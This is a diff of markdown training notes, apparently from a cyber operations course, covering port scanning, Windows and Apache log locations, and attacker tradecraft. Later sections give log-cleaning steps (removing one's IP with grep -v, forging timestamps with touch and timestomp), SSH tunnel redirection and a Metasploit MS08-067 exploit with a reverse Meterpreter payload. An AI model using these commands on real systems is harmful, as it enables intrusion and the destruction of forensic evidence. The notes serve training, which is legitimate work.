@@ -117,41 +117,41 @@ ___
 ### Scenario 1
 
 1. Scan TCP ports 2 through 90 on the target machine. Create scans that will do the following:  
-  a. Return messages on Standard Error with as much detail as possible  `-v`  
-  b. Not perform a DNS Inquiry `-n`  
-  c. Emit a packet without payload  `-z`  
-  d. Timeout after 1 second  `-w1`  
-  e. Record the actions taken  `nc -v -n -z -w1 10.10.1.70 2-90`  
+    * Return messages on Standard Error with as much detail as possible  `-v`  
+    * Not perform a DNS Inquiry `-n`  
+    * Emit a packet without payload  `-z`  
+    * Timeout after 1 second  `-w1`  
+    * Record the actions taken  `nc -v -n -z -w1 10.10.1.70 2-90`  
 
-Port | Service | Status
---- | --- | --- 
-88 | Kerberose | Time Out
-87 | Link | Time Out
-80 | http | Open
-78 | Finger | Time Out
-70 | gopher | Time Out
-68 | Bootpc | Time Out
-67| BootPS  | Time OUt
-65 | tacacs-ds | Time OUt
-53 | Domain | Time Out
-50 | re-mail-ck | Time Out
-49 | tacacs | Time Out
-43 | Whois | Time Out
-42 | NameServer | Time Out
-37 | time | Time Out
-25 | smtp | Time Out
-23 | telnet | Open
-22 | ssh | Open
-21 | ftp | Time Out
-20 | ftp-data | Time Out
-19 | chargen | Time Out
-18| msp | Time Out
-17 | qotd | Time Out
-15| netstat | Time Out
-13| daytime | Time Out
-11 | systat | Time Out
-09 | discard | Time Out
-07 | echo | Time Out
+    Port | Service | Status
+    --- | --- | ---  
+    88 | Kerberose | Time Out
+    87 | Link | Time Out
+    80 | http | Open
+    78 | Finger | Time Out
+    70 | gopher | Time Out
+    68 | Bootpc | Time Out
+    67| BootPS  | Time OUt
+    65 | tacacs-ds | Time OUt
+    53 | Domain | Time Out
+    50 | re-mail-ck | Time Out
+    49 | tacacs | Time Out
+    43 | Whois | Time Out
+    42 | NameServer | Time Out
+    37 | time | Time Out
+    25 | smtp | Time Out
+    23 | telnet | Open
+    22 | ssh | Open
+    21 | ftp | Time Out
+    20 | ftp-data | Time Out
+    19 | chargen | Time Out
+    18| msp | Time Out
+    17 | qotd | Time Out
+    15| netstat | Time Out
+    13| daytime | Time Out
+    11 | systat | Time Out
+    09 | discard | Time Out
+    07 | echo | Time Out
 
 2. If a web port is open, what is the port number?
    * `80`
@@ -630,3 +630,351 @@ Winrm 2.x | Default ports: HTTP/Port 5985 or HTTPS/Port 5985
 * Other Applications
   * Instand Messengers/Chat programs
   * Windows Scheduler Service
+
+### Pre-Vista vs. Vista+ Log Locations
+
+* In a different location:
+  * Pre- Vista folder location: `C:\Windows\System32\config`
+  * Post-Vista folder location: `C:\Windows\System32\winevt\Logs`
+* Event IDs for security logs have changed:
+* Add 4096 to pre-Vista event IDs to obtain Vista+ event ID values
+
+### Dump Log Files
+
+* Created during system or application crashes
+* Contains pertinent information about the state of the system at the time of the crash:
+  * Memory; Processor Registers; Pointers & Other Info
+* Use to diagnose or debug errors
+* UNIX: core dump
+* Microsoft: minidump or memory.dmp (in %SYSTEMROOT%)
+
+### Security Audit Policies
+
+* Security audit policies can also be viewed using the command line via the auditpol . exe command
+* `auditpol.exe /get /category: *`
+
+![AutditPol](./Files/CTE-Week4/Images/Lesson8/auditpol.jpg)
+
+### Server Log Files
+
+* Web servers store a lot of data in various locations
+  * Logs contain information relating to authentication success and failure, IP addresses and more
+    * IIS
+    * Apache
+* Web Proxy servers are used as an intermediary between a web browser and the internet
+* Events are logged in local time but this is configurable
+  * All server log files should be reviewed
+
+### Apache Web Server Logs
+
+* Access logs — contains information about request coming to the web server
+![Apache Web Server](./Files/CTE-Week4/Images/Lesson8/apache-web-server-log1.png)
+* Error logs — contains information about errors encountered by the server
+![Apache Web Server](./Files/CTE-Week4/Images/Lesson8/apache-web-server-log2.png)
+
+### Apache Web Server logs location
+
+* Debian/Ubuntu/LinuxMint
+
+Directive/Setting | Config File | Path Value
+--- | --- | ---
+*SUFFIX | /etc/apache2/envvars | (see configfile for conditional logic)
+APACHE_LOG_DIR | /etc/apache2/envvars | exportAPACHE LOG DIR=/var/10g/apache2SSUFFIX
+AccessLog | /etc/apache2/sites-available/OOO-default.conf | CustomLog S{APACHE LOG DIR}/access.log combined
+ErrorLog | /etc/apache2/apache2.conf | ErrorLogS{APACHE LOG DIR}/error.10g
+LogLevel | /etc/apache2/apache2.conf | warn
+LogFormat | /etc/apache2/apache2.conf |  %O "%{Referer}i" "%{User-Agent}i"" combinedLogFormat "%h %l %u %t "%r" %O" commonLogFormat refererL ogFormat "%{User-agent}i" agent
+CustomLog | /etc/apache2/conf-available/other-vhosts-access-log.conf | CustomLog S{APACHE LOG DIR}/other_vhosts_access.log log.conf vhost combined
+
+___
+
+* Red Hat/Fedora/CentOS
+
+Directive | Config File | Path Value
+--- | --- | ---
+AccessLog | /etc/httpd/conf/httpd.conf | /var/log/httpd/access_log
+ErrorLog | /etc/httpd/conf/httpd.conf | /var/log/httpd/error_log
+LogLevel | /etc/httpd/conf/httpd.conf | warn
+*LogFormat | /etc/httpd/conf/httpd.conf | LogFormat "%h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i""combinedLogFormat "%h %l %u %t "%r" %>s %b" common
+**LogFormat | /etc/httpd/conf/httpd.conf | LogFormat "%h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i" %l %O" combinedio
+*CustomLog | /etc/httpd/conf/httpd.conf | CustomLog "logs/access_log" combined
+
+___
+
+* OpenSUSE  
+
+Directive | Config File | Path Value
+--- | --- | ---
+AccessLog | /etc/apache2/sysconfig.d/global.conf | /var/log/apache2/access_log
+ErrorLog | /etc/apache2/httpd.conf | /var/log/apache2/error_log
+LogLevel | /etc/apache2/sysconfig.d/global.conf | warn
+*LogFormat |  /etc/apache2/mod_log config.conf | LogFormat "%h 0/01 %u %t "%r"  %b" commonLogFormat "%v %h 0/01 %u %t "%r" %b" vhost_commonLogFormat "%{Referer}i -> %U" refererLogFormat "%{User-agent}i agentLogFormat "%h 0/01 %u %t "%r" %b "%{Referer}i" "%{User-Agent}i"" combinedLogFormat "%v %h 0/01 %u %t "%r" %b "%{Referer}i" "%{User-Agent}i"" vhost combined
+**LogFormat | /etc/apache2/mod_log config.conf | LogFormat "%h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i" "%l $O" combinedio
+***LogFormat | /etc/apache2/mod_log | LogFormat "%t %h %{SSL_PROTOCOL}x%{SSL_CIPHER}x"%r" %b" ssl_commonLogformat "%t %h %{SSL_PROTOCOL}x%{SSL_CIPHER}x "%r" %b "%{Referer}i" "%{User-Agent}i"" ssl_combined
+
+### Windows Webserver (IIS) Logs
+
+* Microsoft IIS logs location:
+  * `C:\Windows\system32\LogFiles\W3SVC1`
+* WC3 Extended Log File Format
+
+![IIS Web Server WC3 Log](./Files/CTE-Week4/Images/Lesson8/IIS-Log1.png)
+
+* Microsoft IIS Logging Formats
+  * IIS Log File Format
+
+![IIS Web Server WC3 Log](./Files/CTE-Week4/Images/Lesson8/IIS-Log2.png)
+
+* Microsoft IIS Logging Formats
+  * NCSA Common Log File Format
+    * `172.21 13.45- Microsoft\fred [08/Apr/2001  "GET
+/scripts/iisadmin/ism-dll?http/serv HTTP/I -0" 200 3401`
+  * ODBC Logging
+
+### Logon Events
+
+* These events are essential to establish a pattern of logon times for a user
+* These events are used to flag a logon at an unusual hour or day
+* Failed logon events may be evidence of brute force or password guessing attacks
+* Not all accesses result in a logon event (e.g., FTP does not produce a logon event)
+* See Student Guide for important event IDs
+
+### Log Cleanig
+
+* Attackers
+
+1. Locate any files that have changed since you threw your first exploit
+2. If possible, remove evidence of your mission from the log file
+3. Change the timestamp on the log file to the last entry in the file
+4. If removing your evidence creates a zero-byte file, change the timestamp to another zero-byte file in the same directory
+    * This allows you to blend in if logs are being forwarded
+    * If logs are not being forwarded, change the timestamp to match another file in the directory
+
+* Defenders
+  * Reviewing all logs, and combining output from different logs, assist with determining if the system has been copromised
+* Look for logs that changed since your arrival:
+  * Antivirus, Firewall, Dr. Watson (pre-Vista), Problem Reports and Solutions (Vista+), and Application logs
+  * Unix
+    * Usually easy and straightforward
+  * Windows Event Logs
+    * Very difficult
+  Tools
+    * Unix: find, grep, wc, cat, tail, head (and others)
+    * Windows: dir, find
+
+### Windows find Command
+
+* `run multicommand -c1 "cmd /c find /?"`
+
+```cmd
+C:\Users\honey>find /?
+Searches for a text string in a file or files.
+
+FIND [/V] [/C] [/N] [/I] [/OFF[LINE]] "string" [[drive:][path]filename[ ...]]
+
+  /V         Displays all lines NOT containing the specified string.
+  /C         Displays only the count of lines containing the string.
+  /N         Displays line numbers with the displayed lines.
+  /I         Ignores the case of characters when searching for the string.
+  /OFF[LINE] Do not skip files with offline attribute set.
+  "string"   Specifies the text string to find.
+  [drive:][path]filename
+             Specifies a file or files to search.
+
+If a path is not specified, FIND searches the text typed at the prompt
+or piped from another command.
+```
+
+### Windows findstr Command
+
+* For redirection, provide a shell:
+  * `run multicommand -cl "cmd /c findstr "string" > newfile.txt"`
+
+```cmd
+C:\Users\honey>findstr /?
+Searches for strings in files.
+
+FINDSTR [/B] [/E] [/L] [/R] [/S] [/I] [/X] [/V] [/N] [/M] [/O] [/P] [/F:file]
+        [/C:string] [/G:file] [/D:dir list] [/A:color attributes] [/OFF[LINE]]
+        strings [[drive:][path]filename[ ...]]
+
+  /B         Matches pattern if at the beginning of a line.
+  /E         Matches pattern if at the end of a line.
+  /L         Uses search strings literally.
+  /R         Uses search strings as regular expressions.
+  /S         Searches for matching files in the current directory and all
+             subdirectories.
+  /I         Specifies that the search is not to be case-sensitive.
+  /X         Prints lines that match exactly.
+  /V         Prints only lines that do not contain a match.
+  /N         Prints the line number before each line that matches.
+  /M         Prints only the filename if a file contains a match.
+  /O         Prints character offset before each matching line.
+  /P         Skip files with non-printable characters.
+  /OFF[LINE] Do not skip files with offline attribute set.
+  /A:attr    Specifies color attribute with two hex digits. See "color /?"
+  /F:file    Reads file list from the specified file(/ stands for console).
+  /C:string  Uses specified string as a literal search string.
+  /G:file    Gets search strings from the specified file(/ stands for console).
+  /D:dir     Search a semicolon delimited list of directories
+  strings    Text to be searched for.
+  [drive:][path]filename
+             Specifies a file or files to search.
+
+Use spaces to separate multiple search strings unless the argument is prefixed
+with /C.  For example, 'FINDSTR "hello there" x.y' searches for "hello" or
+"there" in file x.y.  'FINDSTR /C:"hello there" x.y' searches for
+"hello there" in file x.y.
+
+Regular expression quick reference:
+  .        Wildcard: any character
+  *        Repeat: zero or more occurrences of previous character or class
+  ^        Line position: beginning of line
+  $        Line position: end of line
+  [class]  Character class: any one character in set
+  [^class] Inverse class: any one character not in set
+  [x-y]    Range: any characters within the specified range
+  \x       Escape: literal use of metacharacter x
+  \<xyz    Word position: beginning of word
+  xyz\>    Word position: end of word
+
+For full information on FINDSTR regular expressions refer to the online Command
+Reference.
+```
+
+* The newfile.txt file contains a list of IP addresses. We want to remove IP 10.0.100.70 from newfile.txt and then change time/date of file to original date and time.
+
+![findstr1](./Files/CTE-Week4/Images/Lesson8/findstr2.jpg)
+![findstr2](./Files/CTE-Week4/Images/Lesson8/findstr1.jpg)
+
+* Use the move command to overwrite the contents of the original file.
+![findstr3](./Files/CTE-Week4/Images/Lesson8/findstr3.jpg)
+
+### Windows timestamp Command
+
+* Use the timestomp command to return the file to its original date and time.
+![Timestop](./Files/CTE-Week4/Images/Lesson8/TimeStop.jpg)
+
+### Cleaning Logs: Always Use Multicommand Script
+
+![MultiCommand](./Files/CTE-Week4/Images/Lesson8/Multicommand1.jpg)
+![MultiCommand](./Files/CTE-Week4/Images/Lesson8/Multicommand2.jpg)
+
+### Windows Modify File Timestamp With timestomp
+
+![Modify Timestamp](./Files/CTE-Week4/Images/Lesson8/TimeStomp2.jpg)
+
+### Unix Log Cleaning
+
+* Look at contents of file using `cat`
+* Run `cat` and `grep` for you IP
+  * Is your IP present?
+* Use `grep -v` to remove you IP and redirect the output
+* Use `touch` command to change the timestamp
+* example:
+
+```bash
+cat secure | grep -v "<string>" > newfile
+mv newfile secure
+touch -t <date_and_time> secure
+```
+
+### UNIX: Modify File Timestamp with touch Command
+
+![Touch Command](./Files/CTE-Week4/Images/Lesson8/Touch1.jpg)
+
+### Syslog
+
+* Standard protocol for forwarding log messages to a central host
+* Sent in clear text:
+  * Uses UDP/514 by default
+* Small (less than 1 KB) text messages
+* Not native in Windows
+* UNIX: Setting in `/etc/syslog.conf` file:
+  * Look for /oghost setting
+   Check for entry with remote IP address
+
+### Syslog Configuration File
+
+![Syslog](./Files/CTE-Week4/Images/Lesson8/Syslog1.jpg)
+
+### Centralized Log Management
+
+![Splunk](./Files/CTE-Week4/Images/Lesson8/Splunk.jpg)
+
+### Redirection
+
+* Most exploiters tend to use at least one layer of redirection between the attacker and the actual target.
+* Redirection
+  * Adds obfuscation into the connection
+  * Reduces the risk of detection by the target
+* Tunneling
+  * A forard tunnel to deliver the exploit
+  * A reverse tunnel fot the callback
+
+### Redirection via SSH Tunnels
+
+![Redirection via SSH Tunnels](./Files/CTE-Week4/Images/Lesson8/Redirection-SSHTunnels.png)
+
+### SSH Tunnel and Meterpreter Options
+
+![SSH Tunnels](./Files/CTE-Week4/Images/Lesson8/SSHTunnels.png)
+
+### Example 1 : Preparing the Payload
+
+![Example 1](./Files/CTE-Week4/Images/Lesson8/SSHTunnels-Example1.jpg)
+
+### Example 1 : Bad Tradecraft
+
+![Bad Tradecraft](./Files/CTE-Week4/Images/Lesson8/bad-tradecraft.png)
+
+### Redirection Tunnel Example
+
+![Redirectio Tunnel](./Files/CTE-Week4/Images/Lesson8/Redirection-SSHTunnel-example.png)
+
+### Bad Tradecraft Example 2
+
+![Bad Tradecraft 2](./Files/CTE-Week4/Images/Lesson8/bad-tradecraft-2.jpg)
+![Bad Tradecraft Example](./Files/CTE-Week4/Images/Lesson8/bad-tradecraft2.png)
+
+### Redirection Tunnel Example 2
+
+![Redirection Tunnel Example](./Files/CTE-Week4/Images/Lesson8/Redirection-Tunnel-example.jpg)
+
+### Good Tradecraft Example
+
+![Good Tradecraft Example](./Files/CTE-Week4/Images/Lesson8/good-tradecraft-1.jpg)
+![Good Tradecraft Example](./Files/CTE-Week4/Images/Lesson8/good-tradecraft-1.png)
+
+### Initial SSH Tunnel with Jump Point
+
+![Inital Conneciton](./Files/CTE-Week4/Images/Lesson8/tunnel-inial-connection.png)
+
+* `ssh root@10.20.30.40 -L 11111:20.30.40.50:445 -R 80:127.0.0.1.80`
+
+### Outbound Trigger: Target1
+
+![Target1 Conneciton](./Files/CTE-Week4/Images/Lesson8/tunnel-target1-connection.png)
+
+```msf
+msf > us eploit/windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf exploit(ms08_067_netapi) > set RHOST 127.0.0.1
+msf exploit(ms08_067_netapi) > set RPORT 11111
+msf exploit(ms08_067_netapi) > set LHOST 10.20.30.40
+msf exploit(ms08_067_netapi) > set LPORT 80
+msf exploit(ms08_067_netapi) > exploit
+```
+
+* Based on the reverse tunnel, Meterpreter will start a local listener on port 80 (RPORT) on the attack box
+* `ssh root@10.20.30.40 -L 11111:20.30.40.50:445 -R 80:127.0.0.1:80`
+
+### Connection and Callback
+
+![Callback Conneciton](./Files/CTE-Week4/Images/Lesson8/tunnel-callback-connection.png)
+
+* Meterpreter box is still listening on 11111 (forward SSH tunnel).
+* Jump poin is still listening (as well as conneted) on 80 (Reverse SSH) tunnel
+* `ssh root@10.20.30.40 -L11111:20.30.40.50:445 -R 80:127.0.0.1:`
+
+## Module 2, Lesson 8 – Threat Emulation Actions in Logs
